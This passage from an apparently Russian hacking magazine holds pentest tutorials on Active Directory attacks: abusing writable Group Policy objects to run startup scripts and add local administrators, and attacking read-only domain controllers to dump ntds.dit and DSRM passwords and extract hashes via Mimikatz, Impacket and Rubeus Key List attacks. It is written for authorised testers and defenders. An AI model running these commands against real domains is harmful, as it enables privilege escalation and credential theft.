сата, был развернут в туннель GRE с использованием ERSPAN-инкапсуляции.
  Еще один  пример —  перехваченный  ICMP-трафик.  Видимо,  внутри
инфраструктуры шли пинги до сетевого оборудования. В трафике может быть
все что угодно, но мы остановимся на этих примерах.





                          Перехваченный ICMP-трафик


ПЕРЕХВАТ ТРАФИКА С ПОМОЩЬЮ TZSP (MIKROTIK)

Протокол TZSP (TaZmen Sniffer Protocol) — аналог протокола ERSPAN. Здесь
абсолютно те же самые функции. TZSP может передавать зеркалированный
трафик поверх L3-канала и обычно используется в инструменте Packet Sniffer
внутри RouterOS.
   Переходим в раздел конфигурации Packet Sniffer, расположенный в меню
Tools, и настраиваем следующие параметры:
 • streaming-enabled — активирует работу сниффера;
 • streaming-server — IP-адрес, куда будет отправляться зеркалирован‐
  ный трафик;
 • filter-interface — интерфейсы источника, откуда будет дублировать‐
   ся трафик;
 • filter-stream — cниффер будет работать согласно политике фильтров.


[admin@EdgeGW] > /tool sniffer
[admin@EdgeGW] /tool sniffer> set streaming-enabled=yes streaming-
server=172.16.0.1 filter-interface=ether1,ether2 filter-stream=yes
[admin@EdgeGW] /tool sniffer> start





                 Перехваченный с помощью TZSP OSPF-трафик


ВЫВОДЫ

Примерно такими способами можно воспользоваться для пивотинга внутрь
инфраструктуры или поверх сетевого оборудования. Надеюсь, моя работа
подарит пентестерам и редтимерам новый полезный прием. Главное здесь —
протокол GRE, который предоставляет могучие возможности как сетевым
инженерам, так и специалистам по тестированию на проникновение.
ВЗЛОМ
 ЖэПэО





          ЭКСПЛУАТИРУЕМ
     НЕБЕЗОПАСНЫЕ ГРУППОВЫЕ
            ПОЛИТИКИ




Основная  причина  успеха  большинства
взломов, будь то пентест или реальное
проникновение   злоумышленников,  —
это   допущенные    администраторами
ошибки  в  настройках и  конфигурации.         MichelleVermishelle                                                                                          michael.zhmailo@yandex.ru
Сегодня мы поговорим о способах эксплу‐
атации небезопасных групповых политик
в сетях Active Directory.


           WARNING

                       Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный  с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



СТРУКТУРА

Групповые политики используются повсеместно. Это удобный инструмент,
позволяющий системным администраторам управлять настройками клиентских
систем в домене. Сама «архитектура» групповых политик — клиент‑серверная.
Чаще всего контроллер домена выступает в роли сервера, на котором соз‐
даются, настраиваются и изменяются политики, а доменные компьютеры,
пользователи и иные объекты в AD — клиенты, которые эти самые политики
получают и применяют.
   Групповая политика называется Group Policy Object (GPO). Внутри каждой
GPO есть две сущности:
 • Group Policy Container — специальный объект, который имеет идентифика‐
   тор GUID, обозначающий групповую политику. Находится в CN=Policies,
  CN=System ;
 • Group Policy Template — файлы .ADMX и .ADML , позволяющие с помощью
  GPO управлять объектами в AD.

GPO применяется к Organizational Units (организационным единицам). Можно
считать это некой папкой, в которой находятся пользователи, компьютеры
и другие объекты.
   Изначально в только что созданном домене будут две политики:
 • Default Domain Policy — назначается текущему домену;
 • Default Domain Controller’s Policy — назначается OU, в состав которого вхо‐
   дит  контроллер  домена. По  умолчанию имя  этой OU — Domain
  Controllers .

А теперь зайдем в ADUC и увидим, что наравне с OU в домене существуют
и контейнеры.





Контейнеры — это лишь дополнительные объекты, позволяющие организовать
структуру AD. К контейнеру нельзя привязать GPO. Чтобы применить GPO
к контейнеру, сначала следует добавить его в соответствующую OU и уже к ней
привязывать GPO.
  GPO  распространяется по сети через общий сетевой ресурс SYSVOL,
который хранится на контроллере домена. Все пользователи в домене обычно
имеют к нему доступ и периодически синхронизируются для обновления нас‐
троек своих объектов групповой политики. Общий ресурс SYSVOL по умол‐
чанию  указывает на каталог C:\Windows\SYSVOL\sysvol\ на контроллере
домена.
   Для синхронизации нужно время. Иногда на обновление настроек может
уйти до двух часов. Если нам  требуется немедленная  синхронизация, то
на компьютере надо ввести команду


gpupdate /force

С GPO могут быть  связаны какие‑либо  права.  Например,  пользователь
Admin11111 имеет право GenericAll на политику UsersInfo. Неправильная
настройка таких прав приводит к появлению векторов эксплуатации, которые
мы рассмотрим в сегодняшней статье.


ОБНАРУЖЕНИЕ

Обнаружить доступные GPO можно следующим образом:


ls \\<домен>\SYSVOL\<домен>\Policies\





В результате мы получим GUID всех доступных политик.
   Если у нас есть доступ к Active Directory Module, то сможем получить
информацию вот так:


Get-ADObject -LDAPFilter "(ObjectClass=GroupPolicyContainer)"
-Properties Name, DisplayName,gPCFileSysPath | select Name,
DisplayName,GPCFileSysPath | Format-List





Наконец, PowerView имеет такую же функциональность:


Get-NetGpo





Теперь желательно из GUID получить имя политики. Конечно, AD Module
и PowerView умеют делать это самостоятельно, но в случае, если у нас есть
только GUID, имя можно получить следующим образом:


# RSAT
    Get-Gpo -GUID '{205F0E03-17C3-4E9B-925E-330FAD565CA1}'


# PowerView v3
    Get-DomainGPO -Identity '{
205F0E03-17C3-4E9B-925E-330FAD565CA1}' | select DisplayName





Мы также можем изучить политики, привязанные к определенному устройству:


# PowerView v2
    Get-NetGPO -ComputerName name.domain.com


# PowerView v3
    Get-DomainGPO -ComputerIdentity name.domain.com -Properties
Name, DisplayName





Наконец, самое интересное. Пора изучать все ACL на найденные GPO, пыта‐
ясь найти мисконфиг. Сделать это можно с помощью разных средств. Чаще
всего используются или BloodHound, или PowerView:


# PowerView v2
    # Получение ACL на все политики
        Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}


    # Найти GPO, на которые пользователь student имеет права
        Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
| ?{$_.IdentityReference -match "student"}





Пользователь vaska имеет подозрительно высокие права на GPO с GUID {
31B2F340-016D-11D2-945F-00C04FB984F9}. PowerView третьей версии (он же
PowerView DEV) не отстает от своего младшего собрата, но отличается тем, что
не умеет автоматически преобразовывать SID в понятное для человека имя
пользователя, поэтому в конец каждого командлета добавляется огромная
строка:


# PowerView v3
    # Находим ACL на все политики
    Get-DomainGPO|Get-DomainObjectAcl -ResolveGUIDs |
Foreach-Object {$_ | Add-Member -NotePropertyName Identity
-NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value)
-Force; $_}


    # Находим GPO, на которые у пользователя domain\user есть
права
        Get-DomainGPO|Get-DomainObjectAcl -ResolveGUIDs |
Foreach-Object {$_ | Add-Member -NotePropertyName Identity
-NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value)
-Force; $_}| Foreach-Object {if ($_.Identity -eq $("domain\user"))
 {$_}}


    # Находим GPO, на которую пользователи с RID > 1000 имеют
какие-нибудь права:
    Get-DomainObjectAcl -LDAPFilter '(
objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier
 -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights
-match
'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}


    # Обнаружение пользователей (кроме ожидаемых, таких как
Enterprise Admins, Domain Admins), которые могут изменять GPO
    Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | where { $_
.ActiveDirectoryRights -match
"GenericWrite|AllExtendedRights|WriteDacl|WriteProperty|WriteMembe
r|GenericAll|WriteOwner"
 -and $_.SecurityIdentifier -match
"S-1-5-21-3301805923-005976665-244893303-[\d]{4,10}"  }

Наконец, можно использовать BloodHound:


// Находим политики, на которые пользователь USER@DOMAIN.
LOCAL имеет права
    match p=AllShortestPaths((u:User {name: "USER@DOMAIN.LOCAL"})
-[r:MemberOf|GenericWrite*1..]->(o:GPO)) return p

Теперь, обнаружив политики и возможный мисконфиг в виде пользователя
vaska с подозрительными привилегиями, можно приступать к получению учет‐
ной записи этого пользователя. Причем разведка на этом не заканчивается,
мы можем обнаружить объекты, которые имеют право создавать новые GPO
в домене:


Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=cringe,
DC=lab" -ResolveGUIDs | where { $_.ObjectAceType -eq
"Group-Policy-Container" }

Чтобы найти все OU, на которые распространяется политика, воспользуемся
вот таким скриптом:


# PowerView v2
    Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {
Get-NetComputer -ADSpath $_}


# PowerView v3
    Get-DomainOU -GPLink '{<GPP_GUID>}' | % {Get-DomainObject
-SearchBase $_.distinguishedname}|select  samaccounttype, cn





Теперь поищем пользователей, которые могут связывать GPO с OU:


Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.
ObjectAceType -eq "GP-Link" }


Get-DomainOU|Get-DomainObjectAcl -ResolveGUIDs | where { (($_.
ObjectAceType -match "GP-Link|GP-Options") -and  ($_.
ActiveDirectoryRights -eq "WriteProperty")) -or ($_.
ActiveDirectoryRights -eq "WriteProperty|GenericAll|GenericWrite")
} |Foreach-Object {$_ | Add-Member -NotePropertyName Identity
-NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value)
-Force; $_}


ЭКСПЛУАТАЦИЯ

mmc
Криво настроенные права можно эксплуатировать и с помощью стандартного
приложения mmc.exe, установленного на каждом компьютере c Windows. Сна‐
чала запускаем это приложение от лица  пользователя, имеющего  права
на какую‑либо политику. Далее добавляем нужную оснастку.





Добавляем оснастку Group Policy Management, выбираем политику и тогда
сможем ее редактировать.





Например, создадим юзера, зайдя по следующему пути:


Computer configuration > Preferences > Control Panel Settings >
Local Users and Groups > New > Local User > Action: Create > User
name: <user>

А затем добавим его в группу локальных администраторов:


Computer configuration > Preferences > Control Panel Settings >
Local Users and Groups > New > Local User > Action: Update >
Group name : <Administrators> > Members: Add: <user>


Файл .ini
Этот способ я подсмотрел у Дмитрия Неверова, руководителя группы анализа
защищенности внутренней инфраструктуры в компании «Ростелеком‑Солар».
Чаще всего доступа к графическому интерфейсу у нас не будет, поэтому при‐
дется либо использовать инструменты, описанные ниже, либо вручную соз‐
давать специальный конфигурационный файл.
   Например, если наша задача — выполнить скрипт на конечных устройствах,
то сначала нужно создать каталог \Machine\Scripts\Startup в корне GPO
и поместить в него скрипт Test.ps1. Содержимое скрипта может быть любым,
абсолютно любые команды. Следующим шагом в каталоге \Machine\ в корне
GPO потребуется открыть файл psscripts.ini. Это скрытый файл. Если фай‐
ла не существует, его нужно создать. Содержимое файла будет таким:


[Startup]
0CmdLine=Test.ps1
0Parameters=

Этот файл содержит ссылку на скрипт, который нужно выполнить. Также
при необходимости в нем прописываются параметры выполнения (когда они
есть). Если нужно запустить несколько скриптов, первый символ в этом файле
будет инкрементироваться. Для скрипов .bat используется файл scripts.
ini.
   После завершения подготовительных действий остается только изменить
атрибут gpcmachineextensionnames с помощью PowerView:


Set-DomainObject -Identity VulnGPO -Set @{
'gpcmachineextensionnames'=' [{
42B5FAAE-6536-11D2-AE5A-0000F87571E3}{
40B6664F-4972-11D1-A7CA-0000F87571E3}]'}

Значения 42B5FAAE-6536-11D2-AE5A-0000F87571E3 и 40B6664F-4972-11D1-
A7CA-0000F87571E3   документированы   как  ProcessScriptsGroupPolicy
и Scripts  (Startup/Shutdown). Используя их в GPO, мы создаем  воз‐
можность выполнения скрипта при применении групповой политики.
   Причем если атрибут gpcmachineextensionnames уже содержит другие
записи, то их тоже нужно внести в команду. Также стоит изменить параметр
Version в файле GPT.ini на единицу. Теперь после перезагрузки компьютера
скрипт Test.ps1 будет выполнен. По умолчанию задержка на выполнение
скриптов составляет пять минут.
   Подобным  образом  можно  добавлять  локальных  администраторов
на компьютере. Сначала создаем файл GptTmpl.inf по пути \Machine\
Microsoft\Windows NT\SecEdit (иногда эти каталоги отсутствуют и их при‐
дется создать). Содержимое файла будет следующим:


[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Group Membership]
*S-1-5-32-544__Members =
*S-1-5-21-2722789902-3858190539-1593706810-1119

Здесь к локальной группе локальных администраторов ( S-1-5-32-544) добав‐
ляется  SID  доменного  пользователя  (S-1-5-21-2722789902-3858190539-
1593706810-1119). При добавлении пользователя в группу локальных адми‐
нистраторов необходимо учитывать порядок применения GPO. Наши действия
могут привести к тому, что легитимные локальные администраторы будут уда‐
лены из группы локальных администраторов, поэтому стоит добавить и их SID
в файл GptTmpl.inf через запятую.
   Следующий    шаг      заключается     в     изменении      атрибута
gpcmachineextensionnames,  эту  задачу  можно  выполнить  с помощью
PowerView:


Set-DomainObject -Identity VulnGPO -Set @{
'gpcmachineextensionnames'='[{
827D319E-6EAC-11D2-A4EA-00C04F79F83A}{
803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]'}

827D319E-6EAC-11D2-A4EA-00C04F79F83A    имеет    значение   Security,
а  803E14A0-B4FB-11D0-A0D0-00A0C90F574B —  Computer  Restricted
Groups. Применяя их к GPO, мы можем изменять списки участников локальных
групп.
   Помни:         если          атрибуты        gpcuserextensionnames
и gpcmachineextensionnames уже содержат другие записи, их также нужно
внести в нашу команду PowerView. Наконец, не забудь изменить параметр
Version в файле GPT.ini на единицу.


Создание GPO
Если на этапе разведки получилось обнаружить пользователя, который имеет
право создавать GPO и связывать ее с OU, то это также может помочь при экс‐
плуатации. PowerView не имеет возможности создавать GPO, поэтому следует
использовать RSAT. Установка этой утилиты не представляет никаких слож‐
ностей:


Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.
Tools.0.0.1.0
Import-Module GroupPolicy





Заводим новую GPO:


New-Gpo -Name TestGPO





Связываем с OU:


Get-GPO TestGPO | New-GPLink -Target "ou=Test,dc=domain,dc=local"





После успешного связывания можно либо вручную изменять созданную GPO,
как было показано выше, либо использовать для этого подходящие инструмен‐
ты, например SharpGPOAbuse или pyGPOAbuse.
   Когда работы завершатся, GPO будет отвязана от OU:


Remove-GPLink -Name TestGPO -Target "ou=Test,dc=domain,dc=local"

И удалена:


Remove-GPO -Name TestGPO


Перемещение через GPO
Ничто не мешает нам использовать GPO как средство бокового перемещения.
Опять же ставим RSAT:


Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.
Tools.0.0.1.0
Import-Module GroupPolicy

И изменяем созданную политику, добавляя в реестр (в ключ автозагрузки) наш
пейлоад:


Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context
Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\
CurrentVersion\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.
exe' -Type ExpandString

Если установить RSAT нет возможности, то можно импортировать PowerShell-
скрипт , который позволяет создать запланированную задачу:


New-GPOImmediateTask -TaskName evilTask -Command cmd
-CommandArguments "/c c:\dsec\getadmin.cmd" -GPODisplayName
"VictimGPO" -Verbose -Force


ВЫВОДЫ

Групповые политики стоят далеко не на самом первом месте в чек‑листе
типовых уязвимостей Active Directory. Тем не менее, злоупотребляя ими, ата‐
кующий сможет получить чрезвычайно выгодное положение, захватив сразу
целый OU. Самое главное — не забывай, что изменения применяются далеко
не сразу. Компьютерам нужно время для синхронизации. Если ждать нет воз‐
можности, используй команду gpupdate /force.
ВЗЛОМ





            ПЕНТЕСТИМ
          READ-ONLY DOMAIN
           CONTROLLERS



В сетях на основе Windows  существует
специальный    подвид    контроллеров
домена под названием Read-only Domain
Controller. Сегодня мы поговорим об уяз‐
вимостях таких контроллеров и рассмот‐         MichelleVermishelle                                                                                  17 y.o. | TG: @MichaelZhm
рим векторы атак, которые можно к ним       michael.zhmailo@yandex.ru
применить.


ТЕОРИЯ

Определения и особенности
Read-only Domain Controller был представлен в Windows Server 2008. Его
основная цель — обеспечить безопасное взаимодействие сервера со службой
каталогов. Очень часто подобные контроллеры домена ставят в каких‑нибудь
удаленных офисах компании, старых филиалах и прочих местах, где невоз‐
можно гарантировать достаточную физическую безопасность сервера. Получив
доступ к такому устройству, ни один злоумышленник не сможет толком пов‐
лиять на домен.
   Внутри RODC хранится копия базы AD, но чуточку измененная. Во‑первых,
не сохраняется множество атрибутов, например ms-Mcs-AdmPwd — в этом
атрибуте хранится пароль локального администратора при настроенном LAPS.
Во‑вторых, разрешено кешировать учетные данные лишь конкретных поль‐
зователей. Например, пользователей этого самого удаленного офиса.
   Что такое кеширование? Это обычное сохранение учетных данных поль‐
зователей. Сохраняются они в файле ntds.dit, равно как и на обычном кон‐
троллере домена.
   Причем RODC не создает домен, а добавляется в существующий. Делается
это еще на этапе установки и выглядит вот так.





                                 Настройка RODC

При этом  использование RODC дает  множество  преимуществ в  плане
безопасности: отдельный DNS-сервер, изменения в котором никак не отра‐
жаются на основном, делегирование роли администратора любому  поль‐
зователю (причем этот пользователь необязательно должен быть администра‐
тором на обычных контроллерах домена).





                         Назначение пользователей

Также следует выделить особенность репликации (DCSYNC) — она возможна
только со стороны обычного контроллера домена. RODC ничего реплициро‐
вать не может. Также присутствует изоляция SYSVOL — любые изменения
в групповых политиках остаются на RODC и не распространяются на основной
домен.
   Если рассматривать RODC на «тировой» архитектуре Microsoft, то возника‐
ют определенные сложности, так как принадлежащие Tier 0 ресурсы не могут
работать в тех местах, где должны находиться RODC. А RODC не должны
иметь под контролем какие‑либо ресурсы из Tier 0. Поэтому хосты RODC
и учетные данные для подключения к ним никак не могут принадлежать Tier 0,
но вот сами компьютерные объекты RODC следует защищать, как Tier 0.


Атрибуты
RODC имеет множество особенностей. Первая — почти вся нужная атакующе‐
му информация находится в атрибутах компьютерной учетной записи RODC.
Наиболее интересные для нас атрибуты кратко описаны ниже.


managedBy
Здесь  указывается  объект,  которому  делегировано  административное
управление RODC. Любой пользователь или группа, указанные в этом атри‐
буте, являются локальными администраторами на RODC:


Get-ADComputer 'RODC' -prop managedBy





                             Изучение атрибута


msDS-RevealOnDemandGroup, msDS-NeverRevealGroup
В этом атрибуте указываются объекты, учетные данные которых могут кеширо‐
ваться. Кеширование нужно для того, чтобы эти пользователи могли проходить
проверку подлинности на RODC.


Get-ADComputer 'RODC' -prop msDS-RevealOnDemandGroup,
msDS-NeverRevealGroup





                            Изучение атрибутов

Соответственно, существует атрибут, запрещающий кеширование прописан‐
ных в нем учетных данных объектов. Он называется msDS-NeverRevealGroup.


msDS-AuthenticatedToAccountList
Здесь  будут  храниться  объекты, которые успешно  аутентифицировались
на RODC:


Get-ADComputer 'RODC' -prop msDS-AuthenticatedToAccountList





                             Изучение атрибута


msDS-Revealed*
Это целая группа из нескольких атрибутов:
 • msDS-RevealedUsers — список объектов, учетные данные которых  ког‐
   да‑либо кешировались на RODC;
 • msDS-RevealedDSAs — список RODC, которые кешировали пароль поль‐
   зователя;
 • msDS-RevealedList —  список  объектов, учетные данные которых были
   успешно сохранены на RODC.


Get-ADComputer 'RODC' -prop msDS-RevealedList,msDS-RevealedDSAs,
msDS-RevealedUsers





                            Изучение атрибутов


Аутентификация пользователей
RODC кеширует учетные данные определенных пользователей как раз таки,
чтобы проверить их подлинность. После успешной аутентификации по всем
канонам должен быть сгенерирован TGT-билет, но RODC нельзя считать
надежным KDC, поэтому у него создается собственная учетная запись krbtgt.
Ее пароль используется для подписи создаваемых TGT.
   Упомянутая учетная запись имеет необычное имя: krbtgt_<цифры>. Эти
самые цифры — специальный идентификатор ключа, который использовался
для шифрования TGT-билета. Имя новой учетной записи KRBTGT хранится
в атрибуте msDS-KrbTgtLink объекта RODC. А у этой самой новой учетной
записи KRBTGT в атрибуте msDS-KrbTgtLinkBl содержится имя RODC. Таким
образом, обнаружив RODC, можно связать его с конкретным KRBTGT_XXXXX.
И, соответственно, обнаружив KRBTGT_XXXXX, можно связать его с конкретным
RODC.
   Дополнительно отмечу, что RODC имеет право на сброс пароля этой самой
KRBTGT_XXXXX.


Get-ADUser -filter { name -like "krbtgt*"} -prop Name,Created,
PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkBl





                         Нахождение KRBTGT_XXXXX


Get-ADComputer RODC -Properties msDS-KrbTgtLink





                        Нахождение связанного krbtgt


Get-ADUser krbtgt_19160 -Properties msDS-SecondaryKrbTgtNumber,
msDS-KrbTGTLinkBl





                        Нахождение связанного RODC


ПОИСК RODC

Как я уже отметил, ты можешь обнаружить учетную запись с именем KRBTGT_<
цифры>, после чего глянуть ее атрибут msDS-KrbTGTLinkBl и найти связанный
контроллер, но есть и иные способы нахождения RODC.
   Самый простой — использовать фильтр:


Get-ADDomainController -filter {ISReadOnly -eq $True}





                                 Поиск RODC

Также была обнаружена группа «Контроллеры домена —  только чтение»
и «Контроллеры домена предприятия — только чтение», которые имеют RID
521 и 498 соответственно. RODC входит в одну из этих групп в зависимости
от его уровня. Соответственно, мы можем либо перебрать все компьютеры,
анализируя их атрибут PrimaryGroupID, либо сначала получить GUID этих
групп:


Get-ADGroup -filter {name -like "*чтен*"}





                              Нахождение групп

А затем извлечь участников:


Get-ADGroupMember -identity d876774c-474b-4a70-a3d9-e89998e5a99e





                           Находим участников


ПОЛУЧЕНИЕ КЕШИРОВАННЫХ ПАРОЛЕЙ С RODC

Первым делом ты должен получить принципала, который имеет права локаль‐
ного администратора на RODC. Это может быть компрометация как кого‑то
привилегированного, так и просто пользователя, прописанного в атрибуте
managedBy. Но перед этим не забудь выяснить, кого вообще мы можем ском‐
прометировать. Для этого загляни в атрибут msDS-RevealedUsers:


Get-ADComputer 'RODC' -prop msDS-RevealedUsers,
msDS-RevealOnDemandGroup,msDS-RevealedList





                           Просмотр атрибутов





                           Просмотр атрибутов

Столь большие  отличия не  случайны.  Вроде бы  кешировать разрешено
RACHAEL_LAMBERT и администратора, а закешированы данные только второго,
откуда‑то взявшегося RODC и krbtgt_19160. Проблема заключается в том,
что кеширования произойдет только после успешной аутентификации поль‐
зователя в домене. То есть если RACHAEL_LAMBERT сейчас залогинится, то дан‐
ные  этого  пользователя будут  переданы RODC обычным  контроллером
домена для кеширования. Учетные данные RODC и krbtgt_19160 лежат
в кеше потому, что компьютерная учетная запись используется, например,
при работе со службой каталогов, а с помощью KRBTGT шифруются выдава‐
емые TGT.
   Так как все закешированные пароли будут лежать в ntds.dit, то смело
дампим его любым удобным способом. Но сначала нужно получить доступ
от лица локального администратора. Вспомним, что в атрибуте managedBy был
прописан некий FAUSTINO_SHERMAN.





                              Атрибут managedBy

Получаем доступ к этому пользователю, заходим на хост и видим, что мы дей‐
ствительно в группе ЛА.





                Членство в группе локальных администраторов

После этого дампим ntds.dit как нам угодно, например через VSS.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ

  ТОЛЬКО ДЛЯ ЧТЕНИЯ
                                  ПЕНТЕСТИМ
                   READ-ONLY DOMAIN CONTROLLERS





DSRM

У всех контроллеров домена есть такая штука, которая называется DSRM. Она
позволяет сделать «запасной» пароль для учетной записи локального админис‐
тратора на случай, если вдруг основной пароль забыт или утерян.
   Как только мы получили доступ к RODC, обязательно нужно дампить SAM
с целью поиска этого пароля. Пароль связан с учетной записью администра‐
тора, RID которой равен 500.





                                Получение DSRM

Причем если мы сравним этот пароль со стандартным паролем администра‐
тора, то они будут отличаться.





                      Пароль обычного администратора

Нам может повезти, а может нет. Во‑первых, чаще всего устанавливается один
и тот же пароль DSRM на все контроллеры домена, и мы сможем зайти на дру‐
гой контроллер домена от лица администратора. Но, во‑вторых, чтобы зайти
от имени администратора, нужна особая настройка контроллера: требуется,
чтобы   значение   DsrmAdminLogonBehaviour   по   пути   HKLM\System\
CurrentControlSet\Control\Lsa было равно 2.





                                Проверка реестра

Если нам повезет, то мы сможем выполнить вход от имени админской учетки.





                        Успешная аутентификация


ОСОБЕННОСТИ РАБОТЫ KERBEROS С RODC

Самая главная особенность работы Kerberos с RODC в том, что RDOC
не может синхронизироваться с контроллером домена. Процесс DCSYNC воз‐
можен лишь в одну сторону — с обычного контроллера на RODC. Синхронизи‐
ровать что‑либо с RODC невозможно.




                        Дамп с RODC





                         Дамп с DC

Также сгенерированный RODC TGT можно использовать и в домене, отдав его
запросом TGS-REQ на службу krbtgt обычного контроллера домена. Когда
обычный  КД   получает   данный   TGT,  он   смотрит   атрибут  msDS-
RevealOnDemandGroup RODC и  проверяет: если принципал тикета указан
в этом атрибуте и не указан в msDS-NeverRevealGroup, то TGT будет обновлен
до «полного» TGT и подписан ключом обычной учетной записи krbtgt контрол‐
лера домена. Причем обычный  контроллер домена перегенерирует PAC
билета, а не станет его копировать из TGT, сгенерированного RODC.
   Таким  образом, если мы хотим  создать  «золотой»,  «бриллиантовый»
или «сапфировый» тикет, обязательно следить за тем, какой пользователь нам
нужен. Принципал ни в коем случае не должен присутствовать в списке msDS-
NeverRevealGroup.


KEY LIST

Эта атака позволяет извлечь NTLM-хеш пользователя, злоупотребляя особен‐
ностями взаимодействия RODC с обычным контроллером домена. Сначала
«золотой» тикет генерируется с использованием ключа krbtgt RODC и отправ‐
ляется в запросе TGS-REQ на обычный контроллер домена. При этом устанав‐
ливается специальный флаг KERB-KEY-LIST-REQ. И если целевая учетная
запись присутствует в атрибуте msDS-RevealOnDemandGroup RODC и отсутс‐
твует в атрибуте msDS-NeverRevealGroup, то TGS-REP будет содержать струк‐
туру KERB-KEY-LIST-REP с учетными данными пользователя.
   Для выполнения атаки нам нужны:
 1. AES-ключ учетной записи krbtgt с RODC.
 2. Номер версии ключа (последние цифры в имени krbtgt ).
 3. Имя пользователя, хеш которого хотим получить. Пользователь должен
   быть прописан в атрибуте msDS-RevealOnDemandGroup .

Первые два объекта можно получить, используя Mimikatz:


lsadump::lsa /inject /name:krbtgt_19160





                          Извлечение ключа AES-256

А потом можно воспользоваться Rubeus либо Impacket для получения NTLM-
хеша пользователя:


# impacket
    impacket-keylistattack CRINGE/FAUSTINO_SHERMAN:pass123@dc01
-rodcNo 19160 -rodcKey
fa34fec82433432f4b3e3fb8005bd369ddde8f15ee5450e92d9304ecd07bab60
-dc-ip 192.168.116.133 -debug


# Rubeus


    # Сначала запрашиваем TGT
    Rubeus.exe golden /rodcNumber:19160 /aes256:
fa34fec82433432f4b3e3fb8005bd369ddde8f15ee5450e92d9304ecd07bab60 /
user:RACHAEL_LAMBERT /id:1196 /domain:cringe.lab /sid:S-1-5-21-
1437000690-1664695696-1586295871


    # Отдаем TGT в запрос TGS-REQ
        Rubeus.exe asktgs /enctype:aes256 /keyList /service:
krbtgt/cringe.lab /dc:dc1.cringe.lab /ticket:doIFgzCCBX+gA





              Impacket перебирает всех пользователей домена

Листаем вниз и находим хеш пользователя.




    Impacket натыкается на пользователя из msDS-RevealOnDemandGroup


КОНТРОЛЬ НАД ОБЪЕКТОМ RODC

Если вдруг в ходе пентеста получилось обнаружить учетную запись, которая
имеет    права   GenericWrite/GenericAll/WriteProperty   на   msDS-
RevealOnDemandGroup и желательно на msDS-NeverRevealGroup, то захват
домена обеспечен! Все сводится к изменению этих самых атрибутов msDS-
RevealOnDemandGroup и msDS-NeverRevealGroup, что приведет к кеширо‐
ванию паролей новых пользователей.
   Например,  мы  видим,   что  кеширование   неких  RAMONA_TURNER,
RAMON_STEWART и RANDELL_COLON отключено.





                            Изучение атрибутов

Поскольку у нас учетная запись имеет контроль над этим атрибутом, просто
очищаем его:


Set-DomainObject -Identity RODC$ -Clear 'msDS-NeverRevealGroup'





                              Очистка атрибутов

А в атрибут msDS-RevealOnDemandGroup, наоборот, добавляем пользователей:


Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'
=@('CN=RAMONA_TURNER,OU=Test,OU=BDE,OU=Tier 1,DC=cringe,DC=lab',
'CN=RAMON_STEWART,OU=ESM,OU=Stage,DC=cringe,DC=lab',
'CN=RANDELL_COLON,OU=TST,OU=Tier 2,DC=cringe,DC=lab')}





                         Изменение атрибутов

Далее придется некоторое время подождать, пока не пройдет успешная син‐
хронизация RODC с обычным контроллером домена и получение учетных дан‐
ных  пользователей,  указанных  в msDS-RevealOnDemandGroup. Для  этого
мониторь содержимое атрибута msDS-RevealedList: в нем хранится список
объектов, учетные данные которых успешно закешировались на RODC. Коман‐
ды смотри в разделе «Поиск».


ЗАКЛЮЧЕНИЕ

RODC пользуется популярностью у системных администраторов. Да, этот инс‐
трумент удобен, но мало кто знает, что он создает новые векторы для атак.
Самые частые мисконфиги:
 1. Кеширование RODC большого числа учетных данных, например когда
   в msDS-RevealOnDemandGroup  указывают  группу Authenticated
  Users. Компрометируется RODC, и мы получаем доступ к этим данным.
 2. RODC администрируются группой RODC  Admins , которая чаще всего
   не защищена должным образом. Соответственно, атакующий пробивается
   в эту группу, идет на RODC, а далее смотри пункт 1.
 3. Пароль DSRM на обычном контроллере домена и на контроллере домена
  RODC одинаковый.

Иными словами, RODC нельзя считать панацеей, но при грамотном админис‐
трировании множество распространенных ошибок получится сгладить либо
исправить.
ВЗЛОМ





                          ИЗУЧАЕМ
                ВРЕДОНОС TALISMAN
                       НА ПРАКТИКЕ





В 2022 году несколько антивирусных ком‐
паний опубликовали обзоры написанного
на C бэкдора из семейства PlugX под наз‐
ванием Talisman. На примере этого трояна
мы разберем, как выполняется динами‐            rayhunt454
ческий и статический анализ вредонос‐
ного ПО, а также создадим собственные
сигнатуры  для  детектирования  иссле‐
дуемого образца.


Бэкдоры этого семейства известны с марта 2022 года и довольно хорошо изу‐
чены. Впервые описала его возможности компания Trellix, схожий модуль также
 описывает компания Dr.Web под названием BackDoor.PlugX.38 . Конкретно этот
 образец представляет собой многокомпонентную вредоносную программу,
которая попадает на компьютер жертвы благодаря другому трояну‑загрузчику
и работает в оперативной памяти машины.
   Вредонос состоит из трех компонентов: исполняемого файла SNAC.EXE,
имеющего действительную цифровую подпись, который загружает модифи‐
 цированную  злоумышленниками  динамическую  библиотеку WGXMAN.DLL
с помощью техники DLL side-loading. В свою очередь, библиотека содержит
зашифрованный файл SNAC.LOG , в котором спрятана полезная нагрузка. Биб‐
 лиотека запускает шелл‑код в функции DllMain и расшифровывает файл SNAC.
